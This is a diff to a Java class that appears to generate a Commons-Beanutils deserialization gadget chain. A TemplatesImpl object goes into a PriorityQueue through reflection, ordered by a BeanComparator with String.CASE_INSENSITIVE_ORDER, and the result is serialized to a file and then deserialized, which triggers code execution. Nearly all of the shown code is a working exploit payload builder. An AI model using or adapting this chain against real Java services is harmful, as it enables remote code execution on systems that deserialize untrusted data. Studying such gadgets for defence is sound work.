@@ -28,13 +28,15 @@ public class CBCaseInsensitiveOrder {
         setValue(templates,"_tfactory",new TransformerFactoryImpl());
 
 //        BeanComparator beanComparator = new BeanComparator("class" , new NullComparator());
-        BeanComparator beanComparator = new BeanComparator("class" ,new ObjectToStringComparator());
+        BeanComparator beanComparator = new BeanComparator(null ,String.CASE_INSENSITIVE_ORDER);
         PriorityQueue<Object> priorityQueue = new PriorityQueue(2 ,beanComparator);
-        priorityQueue.add(templates);
-        priorityQueue.add(templates);
+        priorityQueue.add("1");
+        priorityQueue.add("1");
 
         Utils.setValue(beanComparator ,"property" ,"outputProperties");
-        Utils.serialize(priorityQueue ,"bin/CBCaseInsensitiveOrder.bin");
+        Utils.setValue(priorityQueue ,"queue" ,new Object[]{templates ,templates});
+
+        System.out.println(Utils.serialize(priorityQueue ,"bin/CBCaseInsensitiveOrder.bin"));
         Utils.unserialize("bin/CBCaseInsensitiveOrder.bin");
 
     }
